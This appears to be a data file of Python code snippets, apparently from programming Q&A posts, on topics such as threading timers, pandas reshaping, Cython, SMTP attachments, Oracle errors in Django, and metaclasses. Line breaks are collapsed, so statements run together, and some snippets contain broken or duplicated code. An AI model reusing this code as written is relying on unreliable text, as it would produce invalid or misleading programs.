"def foo ( ) : subprocess.Popen ( 'start /B someprogramA.exe ' , shell=True ) def bar ( ) : subprocess.Popen ( 'start /B someprogramB.exe ' , shell=True ) def foo_kill ( ) : subprocess.Popen ( 'taskkill /IM someprogramA.exe ' ) def bar_kill ( ) : subprocess.Popen ( 'taskkill /IM someprogramB.exe ' ) class Timer ( threading.Thread ) : def __init__ ( self , minutes ) : self.runTime = minutes threading.Thread.__init__ ( self ) class CountDownTimer ( Timer ) : def run ( self ) : counter = self.runTime for sec in range ( self.runTime ) : # do something time.sleep ( 60 ) # editted from 1800 to 60 - sleeps for a minute counter -= 1timeout=30c=CountDownTimer ( timeout ) c.start ( ) import threadingimport subprocessimport timetimeout=2 # alternate delay gap in minutesdef foo ( ) : subprocess.Popen ( 'start /B notepad.exe ' , shell=True ) def bar ( ) : subprocess.Popen ( 'start /B calc.exe ' , shell=True ) def foo_kill ( ) : subprocess.Popen ( 'taskkill /IM notepad.exe ' ) def bar_kill ( ) : subprocess.Popen ( 'taskkill /IM calc.exe ' ) class Alternator ( threading.Thread ) : def __init__ ( self , timeout ) : self.delay_mins = timeout self.functions = [ ( foo , foo_kill ) , ( bar , bar_kill ) ] threading.Thread.__init__ ( self ) def run ( self ) : while True : for f , kf in self.functions : f ( ) time.sleep ( self.delay_mins*60 ) kf ( ) a=Alternator ( timeout ) a.start ( )"
"cookiecutter https : //github.com/pydanny/cookiecutter-django/ cookiecutter https : //github.com/pydanny/cookiecutter-django/releases/tag/1.8.7 subprocess.CalledProcessError : Command ' [ u'git ' , u'clone ' , u'https : //github.com/pydanny/cookiecutter-django/releases/tag/1.8.7 ' ] ' returned non-zero exit status 128"
"from io import StringIOimport pandas as pdu_cols = [ 'page_id ' , 'web_id ' ] audit_trail = StringIO ( `` 'year_id | web_id2012|efg2013|abc 2014| xyz2015| pqr2016| mnp '' ' ) df11 = pd.read_csv ( audit_trail , sep= '' | '' , names = u_cols ) u_cols = [ 'page_id ' , 'web_id ' , 'months ' ] audit_trail = StringIO ( `` 'year_id | web_id | months2012|efg | 602013|abc | 482014| xyz | 362015| pqr | 242016| mnp | 12 '' ' ) df12 = pd.read_csv ( audit_trail , sep= '' | '' , names = u_cols ) from io import StringIOimport pandas as pdu_cols = [ 'course_name ' , 'page_id ' , 'web_id ' ] audit_trail = StringIO ( `` 'course_name| year_id | web_ida|2012|efga|2013|abc a|2014| xyza|2015| pqra|2016| mnpb|2014| xyzb|2015| pqrb|2016| mnp '' ' ) df11 = pd.read_csv ( audit_trail , sep= '' | '' , names = u_cols )"
"fileMsg = email.mime.base.MIMEBase ( 'application ' , 'octet-stream ' ) fileMsg.set_payload ( file ( '/home/bsingh/python_files/file_dict.txt ' ) .read ( ) ) # email.encoders.encode_base64 ( fileMsg ) fileMsg.add_header ( 'Content-Disposition ' , 'attachment ; filename=LogFile.txt ' ) emailMsg.attach ( fileMsg ) # send email server = smtplib.SMTP ( smtp_server ) server.starttls ( ) server.login ( username , password ) server.sendmail ( from_add , to_addr , emailMsg.as_string ( ) ) server.quit ( )"
"def model_a ( X , x1 , x2 , m1 , b1 , m2 , b2 ) : `` ' f ( x ) has form m1*x + b below x1 , m2*x + b2 above x2 , and is a cubic spline between those two points . ' '' y1 = m1 * X + b1 y2 = m2 * X + b2 if X < = x1 : return y1 # function is linear below x1 if X > = x2 : return y2 # function is linear above x2 # use a cubic spline to interpolate between lower # and upper line segment a , b , c , d = fit_cubic ( x1 , y1 , x2 , y2 , m1 , m2 ) return cubic ( X , a , b , c , d ) def model_b ( X , x1 , x2 , m1 , b1 , m2 , b2 ) : def lo ( x ) : return m1 * x + b1 def hi ( x ) : return m2 * x + b2 def mid ( x ) : y1 = m1 * x + b1 y2 = m2 * x + b2 a , b , c , d = fit_cubic ( x1 , y1 , x2 , y2 , m1 , m2 ) return a * x * x * x + b * x * x + c * x + d return np.piecewise ( X , [ X < =x1 , X > =x2 ] , [ lo , hi , mid ] ) return np.piecewise ( X , [ X < =x1 , X > =x2 ] , [ lo , hi , mid ] )"
"import numpy as npimport numexpr as nefrom sklearn.metrics.pairwise import euclidean_distances # We have 10000 structures with 100 dihedral anglesn = 10000m = 100 # Generate some random datac = np.random.rand ( n , m ) # Generate random int numberx = np.random.randint ( c.shape [ 0 ] ) print c.shape , x # First version with numpy of the dihedral_distances functiondef dihedral_distances ( a , b ) : l = 1./a.shape [ 0 ] return np.sqrt ( l* np.sum ( ( 0.5 ) * ( 1 . - np.cos ( a-b ) ) , axis=1 ) ) # Accelerated version with numexprdef dihedral_distances_ne ( a , b ) : l = 1./a.shape [ 0 ] tmp = ne.evaluate ( 'sum ( ( 0.5 ) * ( 1 . - cos ( a-b ) ) , axis=1 ) ' ) return ne.evaluate ( 'sqrt ( l* tmp ) ' ) # The function of reference I try to be close as possible # in term of computation time % timeit euclidean_distances ( c [ x , : ] , c ) [ 0 ] 1000 loops , best of 3 : 1.07 ms per loop # Computation time of the first version of the dihedral_distances function # We choose randomly 1 structure among the 10000 structures. # And we compute the dihedral distance between this one and the others % timeit dihedral_distances ( c [ x , : ] , c ) 10 loops , best of 3 : 21.5 ms per loop # Computation time of the accelerated function with numexpr % timeit dihedral_distances_ne ( c [ x , : ] , c ) 100 loops , best of 3 : 9.44 ms per loop % load_ext cythonimport numpy as npnp.random.seed ( 1234 ) n = 10000m = 100c = np.random.rand ( n , m ) x = np.random.randint ( c.shape [ 0 ] ) print c.shape , x % % cython -- compile-args=-fopenmp -- link-args=-fopenmp -- forceimport numpy as npcimport numpy as npfrom libc.math cimport sqrt , coscimport cythonfrom cython.parallel cimport parallel , prange # Define a function pointer to a metricctypedef double ( *metric ) ( double [ : , ::1 ] , np.intp_t , np.intp_t ) cdef extern from `` math.h '' nogil : double cos ( double x ) double sqrt ( double x ) @ cython.boundscheck ( False ) @ cython.wraparound ( False ) @ cython.cdivision ( True ) cdef double dihedral_distances ( double [ : , : :1 ] a , np.intp_t i1 , np.intp_t i2 ) : cdef double res cdef int m cdef int j res = 0. m = a.shape [ 1 ] for j in range ( m ) : res += 1 . - cos ( a [ i1 , j ] - a [ i2 , j ] ) res /= 2 . *m return sqrt ( res ) @ cython.boundscheck ( False ) @ cython.wraparound ( False ) @ cython.cdivision ( True ) cdef double dihedral_distances_p ( double [ : , : :1 ] a , np.intp_t i1 , np.intp_t i2 ) : cdef double res cdef int m cdef int j res = 0. m = a.shape [ 1 ] with nogil , parallel ( num_threads=2 ) : for j in prange ( m , schedule='dynamic ' ) : res += 1 . - cos ( a [ i1 , j ] - a [ i2 , j ] ) res /= 2 . *m return sqrt ( res ) @ cython.boundscheck ( False ) @ cython.wraparound ( False ) def pairwise ( double [ : , ::1 ] c not None , np.intp_t x , p = True ) : cdef metric dist_func if p : dist_func = & dihedral_distances_p else : dist_func = & dihedral_distances cdef np.intp_t i , n_structures n_samples = c.shape [ 0 ] cdef double [ : :1 ] res = np.empty ( n_samples ) for i in range ( n_samples ) : res [ i ] = dist_func ( c , x , i ) return res % timeit pairwise ( c , x , False ) 100 loops , best of 3 : 17 ms per loop # Parallel version % timeit pairwise ( c , x , True ) 10 loops , best of 3 : 37.1 ms per loop"
"import pandas as pddf = pd.read_csv ( `` C : dummy '' ) df = df.pivot ( index= [ `` ID '' ] , columns= [ `` Zone '' , '' PTC '' ] , values= [ `` Zone '' , '' PTC '' ] ) # Rename columns and reset the index.df.columns = [ [ `` PTC { } '' , '' Zone { } '' ] , .format ( c ) for c in df.columns ] df.reset_index ( inplace=True ) # Drop duplicatesdf.drop ( [ `` PTC '' , '' Zone '' ] , axis=1 , inplace=True ) ID Agent OV Zone Value PTC1 10 26 M1 10 1002 26.5 8 M2 50 952 26.5 8 M1 6 53 4.5 6 M3 4 403 4.5 6 M4 6 604 1.2 0.8 M1 8 1005 2 0.4 M1 6 105 2 0.4 M2 41 865 2 0.4 M4 2 4 ID Agent OV Zone1 Value1 PTC1 Zone2 Value2 PTC2 Zone3 Value3 PTC31 10 26 M_1 10 100 0 0 0 0 0 02 26.5 8 M_2 50 95 M_1 6 5 0 0 03 4.5 6 M_3 4 40 M_4 6 60 0 0 04 1.2 0.8 M_1 8 100 0 0 0 0 0 05 2 0.4 M_1 6 10 M_2 41 86 M_4 2 4"
"> > > d = { } > > > d.clear < built-in method clear of dict object at 0x7f209051c988 > > > > d.clear.__hash__ < method-wrapper '__hash__ ' of builtin_function_or_method object at 0x7f2090456288 > > > > callable ( d.clear.__hash__ ) True > > > hash ( d.clear ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : unhashable type : 'dict '"
"> > > import numpy as np > > > a = np.arange ( 9 ) .reshape ( ( 3,3 ) ) > > > b = 1 + a*0 > > > barray ( [ [ 1 , 1 , 1 ] , [ 1 , 1 , 1 ] , [ 1 , 1 , 1 ] ] ) In [ 1 ] : a = np.arange ( 10000 ) .reshape ( ( 100,100 ) ) In [ 2 ] : % timeit 1 + a*010000 loops , best of 3 : 31.9 us per loopIn [ 3 ] : % timeit bc = np.broadcast ( a,1 ) ; np.fromiter ( ( v for u , v in bc ) , float ) .reshape ( bc.shape ) 100 loops , best of 3 : 5.2 ms per loopIn [ 4 ] : 5.2e-3/32e-6Out [ 4 ] : 162.5"
"print [ x for x in range ( 5000 , 5200 ) if not [ t for t in range ( 2 , x ) if not x % t ] ]"
"import Tkinter as tkimport localefrom Tkinter import * # locale.setlocale ( locale.LC_NUMERIC , 'pl_PL ' ) master = tk.Tk ( ) w = tk.Scale ( master , from_=0.05 , to=0.1 , resolution=0.01 ) w.pack ( ) tk.mainloop ( )"
"RSQ ( name [ 'BAKD DK ' ] , name [ ' A DKJ ' ] ) SMT ( name [ 'BAKD DK ' ] , name [ ' A DKJ ' ] , name [ 'S QRT ' ] ) XYZ ( BAKD DK , A DKJ ) XYZ ( BAKD DK , A DKJ , S QRT ) > > > import re > > > > > > s = `` RSQ ( name [ 'BAKD DK ' ] , name [ ' A DKJ ' ] ) '' > > > s1 = re.sub ( r '' ^ ( \w+ ) '' , `` XYZ '' , s ) > > > re.sub ( r '' name\ [ ' ( .* ? ) '\ ] '' , r '' \1 '' , s1 ) 'XYZ ( BAKD DK , A DKJ ) '"
"a b0 1 901 2 802 3 403 4 604 5 30 [ { ' a ' : 1 , ' b ' : 90 , 'index ' : 0 } , { ' a ' : 2 , ' b ' : 80 , 'index ' : 1 } , { ' a ' : 3 , ' b ' : 40 , 'index ' : 2 } , { ' a ' : 4 , ' b ' : 60 , 'index ' : 3 } , { ' a ' : 5 , ' b ' : 30 , 'index ' : 4 } ] [ { ' a ' : 1.0 , ' b ' : 90.0 , 'index ' : 0.0 } , { ' a ' : 2.0 , ' b ' : 80.0 , 'index ' : 1.0 } , { ' a ' : 3.0 , ' b ' : 40.0 , 'index ' : 2.0 } , { ' a ' : 4.0 , ' b ' : 60.0 , 'index ' : 3.0 } , { ' a ' : 5.0 , ' b ' : 30.0 , 'index ' : 4.0 } ]"
"[ default ] aws_access_key_id = # # # # # # aws_secret_access_key = # # # # # # # import configparserdef main ( ) : ACCESS_KEY_ID = `` ACCESS_SECRET_KEY = `` config = configparser.RawConfigParser ( ) print ( config.read ( '~/.aws/credentials ' ) ) # # [ ] print ( config.sections ( ) ) # # [ ] ACCESS_KEY_ID = config.get ( 'default ' , 'aws_access_key_id ' ) # # configparser.NoSectionError : No section : 'default ' print ( ACCESS_KEY_ID ) if __name__ == '__main__ ' : main ( )"
"{ `` sessionTimeout '' : '' 3600.0 '' , `` serverVersion '' : '' LK_LK-NL-7_188-176-419 '' , `` worldDawn '' : '' 2018-10-09 06:00:00 Etc/GMT '' , `` Data '' : { `` Player '' : [ { `` nick '' : '' Player11226400 '' , `` points '' : '' 44 '' , `` alliancePermission '' : '' 0 '' , `` isOnVacation '' : '' false '' , `` id '' : '' 5048 '' , `` rank '' : '' 561 '' , `` entityName '' : '' Player '' , } , { `` nick '' : '' Player11230580 '' , `` points '' : '' 15 '' , `` alliancePermission '' : '' 0 '' , `` isOnVacation '' : '' false '' , `` id '' : '' 5215 '' , `` rank '' : '' 2081 '' , `` entityName '' : '' Player '' , } , { `` nick '' : '' Player11291581 '' , `` points '' : '' 15 '' , `` alliancePermission '' : '' 0 '' , `` isOnVacation '' : '' false '' , `` id '' : '' 5942 '' , `` rank '' : '' 2081 '' , `` entityName '' : '' Player '' , } ] } }"
"import numpyimport scipyfrom scipy.integrate import odeintdef deriv_x ( x , t ) : return array ( [ x [ 1 ] , -55.3E10/ ( x [ 0 ] ) **2 ] ) # 55.3E10 is the value for G*M in km and hoursxinit = array ( [ 0,5251 ] ) # this is the velocity for an orbit of period 24 hourst=linspace ( 0,24.0,100 ) x=odeint ( deriv_x , xinit , t ) def deriv_y ( y , t ) : return array ( [ y [ 1 ] , -55.3E10/ ( y [ 0 ] ) **2 ] ) yinit = array ( [ 20056,0 ] ) # this is the radius for an orbit of period 24 hourst=linspace ( 0,24.0,100 ) y=odeint ( deriv_y , yinit , t )"
"cx_oracle==5.1.3Django==1.8.3Oracle Client : instantclient-basic-linux.x64-12.1.0.2.0Database version : 11.2.0.3.0 Traceback ( most recent call last ) : File `` /usr/lib/python2.7/site-packages/django/core/handlers/wsgi.py '' , line 177 , in __call__ signals.request_started.send ( sender=self.__class__ , environ=environ ) File `` /usr/lib/python2.7/site-packages/django/dispatch/dispatcher.py '' , line 189 , in send response = receiver ( signal=self , sender=sender , **named ) File `` /usr/lib/python2.7/site-packages/django/db/__init__.py '' , line 64 , in close_old_connections conn.close_if_unusable_or_obsolete ( ) File `` /usr/lib/python2.7/site-packages/django/db/backends/base/base.py '' , line 403 , in close_if_unusable_or_obsolete self.close ( ) File `` /usr/lib/python2.7/site-packages/django/db/backends/base/base.py '' , line 198 , in close self._close ( ) File `` /usr/lib/python2.7/site-packages/django/db/backends/base/base.py '' , line 152 , in _close return self.connection.close ( ) File `` /usr/lib/python2.7/site-packages/django/db/utils.py '' , line 98 , in __exit__ six.reraise ( dj_exc_type , dj_exc_value , traceback ) File `` /usr/lib/python2.7/site-packages/django/db/backends/base/base.py '' , line 152 , in _close return self.connection.close ( ) django.db.utils.OperationalError : ORA-03113 : end-of-file on communication channelProcess ID : 10345Session ID : 195 Serial number : 54225 [ pid : 30|app : 0|req : 1/4 ] 123.123.123.123 ( ) { 46 vars in 1024 bytes } [ Fri May 27 15:58:34 2016 ] GET /admin/ = > generated 0 bytes in 8 msecs ( HTTP/1.1 500 ) 0 headers in 0 bytes ( 0 switches on core 0 ) [ pid : 28|app : 0|req : 4/5 ] 123.123.123.123 ( ) { 46 vars in 1024 bytes } [ Fri May 27 15:58:38 2016 ] GET /admin/ = > generated 31712 bytes in 291 msecs ( HTTP/1.1 200 ) 6 headers in 251 bytes ( 1 switches on core 0 ) [ pid : 28|app : 0|req : 5/6 ] 123.123.123.123 ( ) { 46 vars in 1024 bytes } [ Fri May 27 15:58:39 2016 ] GET /admin/ = > generated 31712 bytes in 276 msecs ( HTTP/1.1 200 ) 6 headers in 251 bytes ( 1 switches on core 0 ) [ pid : 28|app : 0|req : 6/7 ] 123.123.123.123 ( ) { 46 vars in 1024 bytes } [ Fri May 27 15:58:40 2016 ] GET /admin/ = > generated 31712 bytes in 288 msecs ( HTTP/1.1 200 ) 6 headers in 251 bytes ( 1 switches on core 0 ) [ pid : 30|app : 0|req : 2/8 ] 123.123.123.123 ( ) { 46 vars in 1024 bytes } [ Fri May 27 15:58:40 2016 ] GET /admin/ = > generated 31712 bytes in 608 msecs ( HTTP/1.1 200 ) 6 headers in 251 bytes ( 1 switches on core 0 ) Fri May 27 15:58:41 2016 - SIGPIPE : writing to a closed pipe/socket/fd ( probably the client disconnected ) on request /admin/ ( ip 131.180.77.1 ) ! ! ! Traceback ( most recent call last ) : File `` /usr/lib/python2.7/site-packages/django/core/handlers/wsgi.py '' , line 177 , in __call__ signals.request_started.send ( sender=self.__class__ , environ=environ ) File `` /usr/lib/python2.7/site-packages/django/dispatch/dispatcher.py '' , line 189 , in send response = receiver ( signal=self , sender=sender , **named ) File `` /usr/lib/python2.7/site-packages/django/db/__init__.py '' , line 64 , in close_old_connections conn.close_if_unusable_or_obsolete ( ) File `` /usr/lib/python2.7/site-packages/django/db/backends/base/base.py '' , line 403 , in close_if_unusable_or_obsolete self.close ( ) File `` /usr/lib/python2.7/site-packages/django/db/backends/base/base.py '' , line 198 , in close self._close ( ) File `` /usr/lib/python2.7/site-packages/django/db/backends/base/base.py '' , line 152 , in _close return self.connection.close ( ) File `` /usr/lib/python2.7/site-packages/django/db/utils.py '' , line 98 , in __exit__ six.reraise ( dj_exc_type , dj_exc_value , traceback ) File `` /usr/lib/python2.7/site-packages/django/db/backends/base/base.py '' , line 152 , in _close return self.connection.close ( ) django.db.utils.OperationalError : ORA-03135 : connection lost contactProcess ID : 10345Session ID : 195 Serial number : 54225 ( 4043057216 ) [ 31-MAY-2016 15:18:51:303 ] nioqsn : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqsn : exit ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqrc : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nsbasic_bsd : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nsbasic_bsd : tot=0 , plen=13 . ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nttfpwr : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nttfpwr : socket 29 had bytes written=13 ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nttfpwr : exit ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nsbasic_bsd : packet dump ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nsbasic_bsd : 00 0D 00 00 06 00 00 00 | ... ... ..| ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nsbasic_bsd : 00 00 03 0F 0F | ... .. | ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nsbasic_bsd : exit ( 0 ) ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nsbasic_brc : entry : oln/tot=0 ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nttfprd : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] ntt2err : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] ntt2err : Read unexpected EOF ERROR on 29 ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] ntt2err : exit ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nttfprd : exit ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nserror : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nserror : nsres : id=0 , op=68 , ns=12537 , ns2=12560 ; nt [ 0 ] =507 , nt [ 1 ] =0 , nt [ 2 ] =0 ; ora [ 0 ] =0 , ora [ 1 ] =0 , ora [ 2 ] =0 ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nsbasic_brc : exit : oln=0 , dln=0 , tot=0 , rc=-1 ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqer : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqer : incoming err = 12151 ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqce : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqce : exit ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqer : returning err = 3113 ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqer : exit ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqrc : exit ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqds : entry ( 4043057216 ) [ 31-MAY-2016 15:18:51:304 ] nioqds : disconnecting ... SELECT PROFILE , LIMIT FROM DBA_PROFILES WHERE RESOURCE_NAME = 'IDLE_TIME ' ; and : DEFAULT UNLIMITEDSELECT PROFILE FROM DBA_USERS WHERE USERNAME = 'DJANGO_USER ' ; DEFAULT"
"import nltk.tokenize.punktimport pickleimport codecstokenizer = nltk.tokenize.punkt.PunktSentenceTokenizer ( ) text = codecs.open ( `` someplain.txt '' , `` r '' , `` utf8 '' ) .read ( ) tokenizer.train ( text ) out = open ( `` someplain.pk '' , `` wb '' ) pickle.dump ( tokenizer , out ) out.close ( )"
"class MyType ( type ) : def __new__ ( cls , name , bases , attrs ) : # wraps the 'test ' method to automate context management and other stuff attrs [ 'test ' ] = cls.other_wrapper ( attrs [ 'test ' ] ) attrs [ 'test ' ] = cls.context_wrapper ( attrs [ 'test ' ] ) return super ( MyType , cls ) .__new__ ( cls , name , bases , attrs ) @ classmethod def context_wrapper ( cls , operation ) : def _manage_context ( self , *args , **kwargs ) : # Sets the context to 'blabla ' before the execution self.context = 'blabla ' returned = operation ( self , *args , **kwargs ) # Cleans the context after execution self.context = None return returned return _manage_context @ classmethod def other_wrapper ( cls , operation ) : def _wrapped ( self , *args , **kwargs ) : # DO something with self and *args and **kwargs return operation ( self , *args , **kwargs ) return _wrapped class Parent ( object ) : __metaclass__ = MyType def test ( self ) : # Here the context is set : print self.context # prints blabla class Child ( Parent ) : def test ( self ) : # Here the context is set too print self.context # prints blabla super ( Child , self ) .test ( ) # But now the context is unset , because Parent.test is also wrapped by _manage_context # so this prints 'None ' , which is not what was expected print self.context @ classmethoddef validation_wrapper ( cls , operation ) : def _wrapped ( self , *args , **kwargs ) : # Validate the value of a kwarg # But if this is executed because we called super ( Child , self ) .test ( ... # ` self.some_minimum ` will be ` Child.some_minimum ` , which is irrelevant # considering that we called ` Parent.test ` if not kwarg [ 'some_arg ' ] > self.some_minimum : raise ValueError ( 'Validation failed ' ) return operation ( self , *args , **kwargs ) return _wrapped"
"from __future__ import division import numpy as np from astropy.io import fits as pyfits # or use 'import pyfits , same thing ' # ( lots of code in between : defining variables and simple calculations ... # probably not relevant ) header [ 'BSCALE ' ] = ( 1.00000 , 'REAL = TAPE*BSCALE + BZERO ' ) header [ 'BZERO ' ] = ( 0.0 ) header [ 'BUNIT ' ] = ( 'mag ' , 'UNIT OF INTENSITY ' ) header [ 'BLANK ' ] = ( -100.00 , 'BLANK VALUE ' ) header [ 'CRVAL1 ' ] = ( glon_center , 'REF VALUE POINT DEGR ' ) # FIRST COORDINATE OF THE CENTER header [ 'CRPIX1 ' ] = ( center_x+0.5 , 'REF POINT PIXEL LOCATION ' ) # # REFERENCE X PIXEL header [ 'CTYPE1 ' ] = ( 'GLON-CAR ' , 'COORD TYPE : VALUE IS DEGR ' ) header [ 'CDELT1 ' ] = ( -glon_length/x_length , 'COORD VALUE INCREMENT WITH COUNT DGR ' ) # # # degrees per pixel header [ 'CROTA1 ' ] = ( 0 , 'CCW ROTATION in DGR ' ) header [ 'CRVAL2 ' ] = ( glat_center , 'REF VALUE POINT DEGR ' ) # Y COORDINATE OF THE CENTER header [ 'CRPIX2 ' ] = ( center_y+0.5 , 'REF POINT PIXEL LOCATION ' ) # Y REFERENCE PIXEL header [ 'CTYPE2 ' ] = ( 'GLAT-CAR ' , 'COORD TYPE : VALUE IS DEGR ' ) # WAS CAR OR TAN header [ 'CDELT2 ' ] = ( glat_length/y_length , 'COORD VALUE INCREMENT WITH COUNT DGR ' ) # degrees per pixel header [ 'CROTA2 ' ] = ( rotation , 'CCW ROTATION IN DEGR ' ) # NEGATIVE ROTATES CCW around origin ( bottom left ) . header [ 'DATAMIN ' ] = ( data_min , 'Minimum data value in the file ' ) header [ 'DATAMAX ' ] = ( data_max , 'Maximum data value in the file ' ) header [ 'TELESCOP ' ] = ( `` Produced from 2MASS '' ) pyfits.update ( filename , map_data , header )"
"list1 = [ 1,1,1,1,1 ] list2 = [ 2,2,2,2,2 ] output = [ 1,1,2,1,2,2,1,2,1,2 ] # There are more than two ' 1 ' standing next two each otheroutput = [ 1,1,1,2,2,1,2,1,2,2 ] def guyGenerator ( toughGuy , softGuy ) : i = 0 while len ( softGuy ) > 0 : temp = softGuy [ :1 ] while i < len ( toughGuy ) - 1 : if toughGuy [ i ] == toughGuy [ i + 1 ] == 2 : toughGuy.insert ( random.randint ( i , i + 1 ) , temp [ 0 ] ) i = i + 1 softGuy = softGuy [ 1 : ] return toughGuy [ 2 , 1 , 1 , 2 , 1 , 1 , 1 , 2 , 1 , 1 , 1 , 1 , 1 , 1 , 2 , 1 , 2 , 1 , 1 , 1 , 2 , 1 , 2 ] import randomclass GuyGenerator : def __init__ ( self , toughGuyList , softGuyList ) : self.toughGuyList = toughGuyList self.softGuyList = softGuyList def __iter__ ( self ) : return self def __next__ ( self ) : listSum = self.toughGuyList + self.softGuyList while True : res = random.sample ( listSum , len ( listSum ) ) if not any ( [ res [ i-2 ] ==res [ i-1 ] ==res [ i ] for i in range ( len ( listSum ) ) ] ) : break return restoughGuy = [ 'tough ' , 'tough ' , 'tough ' , 'tough ' , 'tough ' , 'tough ' , 'tough ' , 'tough ' ] softGuy = [ 'soft ' , 'soft ' , 'soft ' , 'soft ' , 'soft ' , 'soft ' , 'soft ' , 'soft ' ] for guy in GuyGenerator ( toughGuy , softGuy ) : print ( guy ) def __iter__ ( self ) : listSum = self.listRandom1 + self.listRandom2 while True : self.res = random.sample ( listSum , len ( listSum ) ) if not any ( [ self.res [ i-2 ] ==self.res [ i-1 ] ==self.res [ i ] for i in range ( len ( listSum ) ) ] ) : break return iter ( self.res )"
"x = np.array ( [ [ -1 , -1 , -1 ] , [ -1 , -1,1 ] , [ -1,1 , -1 ] , [ 1 , -1 , -1 ] , [ 1,1,1 ] , [ 1,1 , -1 ] , [ 1 , -1,1 ] , [ -1,1,1 ] , [ 0,0,0 ] ] ) simp = scipy.spatial.Delaunay ( x ) .simplices N = 3 # The dimensions of our pointsoptions = 'Qt Qbb Qc ' if N < = 3 else 'Qt Qbb Qc Qx ' # Set the QHull optionstri = scipy.spatial.Delaunay ( points , qhull_options = options ) .simpliceskeep = np.ones ( len ( tri ) , dtype = bool ) for i , t in enumerate ( tri ) : if abs ( np.linalg.det ( np.hstack ( ( points [ t ] , np.ones ( [ 1 , N+1 ] ) .T ) ) ) ) < 1E-15 : keep [ i ] = False # Point is coplanar , we do n't want to keep ittri = tri [ keep ]"
"np.random.rand ( 30 , 20 )"
"class Report ( db.Model , CRUDMixin ) : report_id = Column ( Integer , primary_key=True ) user_id = Column ( Integer , ForeignKey ( 'users.user_id ' ) , index=True ) report_hash = Column ( Unicode , index=True , unique=True ) created_at = Column ( DateTime , nullable=False , default=dt.datetime.utcnow ) uploaded_at = Column ( DateTime , nullable=False , default=dt.datetime.utcnow ) class ReportSchema ( ModelSchema ) : class Meta : model = Report"
"$ cat requirements.txt Flask==0.10.1Jinja2==2.7.1MarkupSafe==0.18Werkzeug==0.9.3argparse==1.2.1gevent==0.13.8gevent-socketio==0.3.5-rc2gevent-websocket==0.3.6greenlet==0.4.1itsdangerous==0.23wsgiref==0.1.2 # Called from __main__def run_dev_server ( ) : app.debug = True port = 5000 dapp = werkzeug.debug.DebuggedApplication ( app , evalex = True ) SocketIOServer ( ( `` , port ) , dapp , resource= '' socket.io '' ) .serve_forever ( ) @ app.route ( '/socket.io/ < path : rest > ' ) def push_stream ( rest ) : print 'ws connect ' , rest try : socketio.socketio_manage ( request.environ , { '/join_notification ' : JoinsNamespace } , request ) except Exception as e : app.logger.error ( `` Exception while handling socketio connection '' , exc_info=True ) return flask.Response ( ) Map ( [ < Rule '/ ' ( HEAD , OPTIONS , GET ) - > root > , < Rule '/socket.io/ < rest > ' ( HEAD , OPTIONS , GET ) - > push_stream > , < Rule '/static/ < filename > ' ( HEAD , OPTIONS , GET ) - > static > ] ) socket = io.connect ( '/join_notification ' ) console.log ( socket ) socket.on ( 'connect ' , function ( ) { console.log ( 'connected to websocket ' ) socket.emit ( 'login ' , { 'name ' : data [ 'name ' ] } ) } ) socket.on ( 'disconnect ' , function ( ) { console.log ( 'd/c\ 'd from websocket ' ) } ) socket.on ( 'join_error ' , function ( ) { ... } ) socket.on ( 'join_success ' , function ( data ) { ... } ) socket.on ( 'join ' , function ( data ) { ... } )"
"class ActorBase ( gevent.Greenlet ) : __metaclass__ = abc.ABCMeta @ abc.abstractmethod def foo ( self ) : print `` foo '' class ActorBaseTest ( ActorBase ) : def bar ( self ) : print `` bar '' abt = ActorBaseTest ( ) # no errors ! class ActorBase ( object ) : __metaclass__ = abc.ABCMeta @ abc.abstractmethod def foo ( self ) : print `` foo '' class ActorBaseTest ( ActorBase ) : def bar ( self ) : print `` bar '' > > > abt = ActorBaseTest ( ) Traceback ( most recent call last ) : File `` /home/dw/.virtualenvs/prj/local/lib/python2.7/site-packages/IPython/core/interactiveshell.py '' , line 2827 , in run_codeexec code_obj in self.user_global_ns , self.user_ns File `` < ipython-input-6-d67a142e7297 > '' , line 1 , in < module > abt = ActorBaseTest ( ) TypeError : Ca n't instantiate abstract class ActorBaseTest with abstract methods foo"
